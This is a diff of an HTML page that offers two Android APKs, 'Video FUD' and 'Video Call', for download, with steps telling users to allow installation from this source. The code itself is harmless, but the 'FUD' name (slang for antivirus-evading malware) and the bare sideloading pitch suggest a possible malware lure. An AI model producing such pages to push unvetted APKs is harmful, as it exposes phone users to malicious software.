@@ -1,192 +1,287 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Video FUD - Download</title>
+    <title>Video FUD - APK Download</title>
 
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-    body {
-      font-family: Arial, sans-serif;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #0f172a, #2563eb);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+            color: #222;
+        }
 
-    .card {
-      width: 100%;
-      max-width: 420px;
-      background: #fff;
-      border-radius: 25px;
-      padding: 30px 22px;
-      text-align: center;
-      box-shadow: 0 20px 50px rgba(0,0,0,.25);
-    }
+        header {
+            background: #111827;
+            color: white;
+            text-align: center;
+            padding: 25px 15px;
+        }
 
-    .icon {
-      width: 95px;
-      height: 95px;
-      margin: 0 auto 18px;
-      border-radius: 24px;
-      background: #2563eb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 48px;
-    }
+        header h1 {
+            font-size: 30px;
+            margin-bottom: 8px;
+        }
 
-    h1 {
-      color: #111827;
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
+        header p {
+            font-size: 15px;
+            color: #d1d5db;
+        }
 
-    .description {
-      color: #6b7280;
-      font-size: 15px;
-      line-height: 1.6;
-      margin-bottom: 22px;
-    }
+        .container {
+            max-width: 700px;
+            margin: 25px auto;
+            padding: 0 15px;
+        }
 
-    .download-btn,
-    .view-btn {
-      width: 100%;
-      display: block;
-      padding: 16px;
-      border-radius: 14px;
-      text-decoration: none;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-    }
+        .app-card {
+            background: white;
+            border-radius: 15px;
+            padding: 22px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
 
-    .download-btn {
-      background: #16a34a;
-      color: white;
-    }
+        .app-card h2 {
+            font-size: 23px;
+            margin-bottom: 10px;
+        }
 
-    .download-btn:active,
-    .view-btn:active {
-      transform: scale(.98);
-    }
+        .app-card p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
 
-    .success {
-      display: none;
-      margin-top: 18px;
-      padding: 15px;
-      border-radius: 14px;
-      background: #dcfce7;
-      color: #166534;
-      font-weight: bold;
-      line-height: 1.5;
-    }
+        .info {
+            background: #f3f4f6;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
 
-    .view-btn {
-      display: none;
-      margin-top: 12px;
-      background: #2563eb;
-      color: white;
-    }
+        .download-btn {
+            display: block;
+            width: 100%;
+            text-align: center;
+            text-decoration: none;
+            background: #2563eb;
+            color: white;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
 
-    .steps {
-      text-align: left;
-      margin-top: 22px;
-      padding: 15px;
-      background: #f3f4f6;
-      border-radius: 14px;
-      color: #374151;
-      font-size: 14px;
-      line-height: 1.7;
-    }
+        .download-btn:hover {
+            background: #1d4ed8;
+        }
 
-    .footer {
-      margin-top: 18px;
-      color: #9ca3af;
-      font-size: 12px;
-    }
-  </style>
+        .view-btn {
+            display: block;
+            width: 100%;
+            text-align: center;
+            text-decoration: none;
+            background: #e5e7eb;
+            color: #111827;
+            padding: 13px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .view-btn:hover {
+            background: #d1d5db;
+        }
+
+        .success {
+            display: none;
+            background: #dcfce7;
+            color: #166534;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 12px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .steps {
+            background: white;
+            border-radius: 15px;
+            padding: 22px;
+            margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+
+        .steps h2 {
+            margin-bottom: 12px;
+        }
+
+        .steps ol {
+            padding-left: 22px;
+            line-height: 1.8;
+        }
+
+        footer {
+            text-align: center;
+            padding: 25px 15px;
+            color: #777;
+            font-size: 14px;
+        }
+
+        @media (max-width: 500px) {
+            header h1 {
+                font-size: 25px;
+            }
+
+            .app-card h2 {
+                font-size: 21px;
+            }
+        }
+    </style>
 </head>
 
 <body>
 
-  <div class="card">
+<header>
+    <h1>APK Download</h1>
+    <p>Download Android Apps</p>
+</header>
 
-    <div class="icon">📱</div>
 
-    <h1>Video FUD</h1>
+<div class="container">
 
-    <div class="description">
-      Download the Video FUD Android application.
+    <!-- VIDEO FUD APP -->
+
+    <div class="app-card">
+
+        <h2>📱 Video FUD</h2>
+
+        <p>
+            Download the Video FUD Android application
+            from this website.
+        </p>
+
+        <div class="info">
+            <b>App:</b> Video FUD<br>
+            <b>Platform:</b> Android<br>
+            <b>File:</b> Video_FUD.apk
+        </div>
+
+        <a
+            class="download-btn"
+            href="Video_FUD.apk"
+            download="Video_FUD.apk"
+            onclick="showMessage('success1')"
+        >
+            ⬇ Download Video FUD
+        </a>
+
+        <a
+            class="view-btn"
+            href="Video_FUD.apk"
+            target="_blank"
+        >
+            👁 VIEW APK
+        </a>
+
+        <div id="success1" class="success">
+            ✅ Download Started Successfully!
+        </div>
+
     </div>
 
-    <!-- APK DOWNLOAD -->
-    <a
-      id="downloadBtn"
-      class="download-btn"
-      href="Video_FUD.apk"
-      download="Video_FUD.apk">
-      ⬇️ DOWNLOAD APK
-    </a>
 
-    <!-- SUCCESS MESSAGE -->
-    <div id="successBox" class="success">
-      ✅ Download Started Successfully!
-      <br>
-      APK डाउनलोड शुरू हो गया है।
+    <!-- VIDEO CALL APP -->
+
+    <div class="app-card">
+
+        <h2>📹 Video Call</h2>
+
+        <p>
+            Download the Video Call Android application
+            from this website.
+        </p>
+
+        <div class="info">
+            <b>App:</b> Video Call<br>
+            <b>Platform:</b> Android<br>
+            <b>File:</b> Video_Call.apk
+        </div>
+
+        <a
+            class="download-btn"
+            href="Video_Call.apk"
+            download="Video_Call.apk"
+            onclick="showMessage('success2')"
+        >
+            ⬇ Download Video Call
+        </a>
+
+        <a
+            class="view-btn"
+            href="Video_Call.apk"
+            target="_blank"
+        >
+            👁 VIEW APK
+        </a>
+
+        <div id="success2" class="success">
+            ✅ Download Started Successfully!
+        </div>
+
     </div>
 
-    <!-- VIEW APK -->
-    <a
-      id="viewBtn"
-      class="view-btn"
-      href="Video_FUD.apk"
-      target="_blank">
-      📂 VIEW APK
-    </a>
+
+    <!-- INSTALL STEPS -->
 
     <div class="steps">
-      <b>Install करने का तरीका:</b><br>
-      1. DOWNLOAD APK दबाएँ।<br>
-      2. Download पूरा होने दें।<br>
-      3. VIEW APK दबाएँ।<br>
-      4. Android का installer खुले तो <b>Install</b> दबाएँ।
+
+        <h2>📲 How to Install APK</h2>
+
+        <ol>
+            <li>Download the APK.</li>
+            <li>Open the downloaded APK file.</li>
+            <li>If Android asks for permission, allow installation from this source.</li>
+            <li>Tap Install.</li>
+            <li>After installation, open the app.</li>
+        </ol>
+
     </div>
 
-    <div class="footer">
-      Android APK • Official Download Page
-    </div>
+</div>
 
-  </div>
 
-  <script>
-    const downloadBtn = document.getElementById("downloadBtn");
-    const successBox = document.getElementById("successBox");
-    const viewBtn = document.getElementById("viewBtn");
+<footer>
+    © 2026 APK Download Website
+</footer>
 
-    downloadBtn.addEventListener("click", function () {
 
-      successBox.style.display = "block";
-      viewBtn.style.display = "block";
+<script>
 
-      downloadBtn.innerHTML = "✅ DOWNLOAD STARTED";
+function showMessage(id) {
 
-      setTimeout(function () {
-        downloadBtn.innerHTML = "⬇️ DOWNLOAD APK";
-      }, 3000);
+    const message = document.getElementById(id);
 
-    });
-  </script>
+    message.style.display = "block";
+
+    setTimeout(function() {
+        message.style.display = "none";
+    }, 5000);
+
+}
+
+</script>
 
 </body>
 </html>
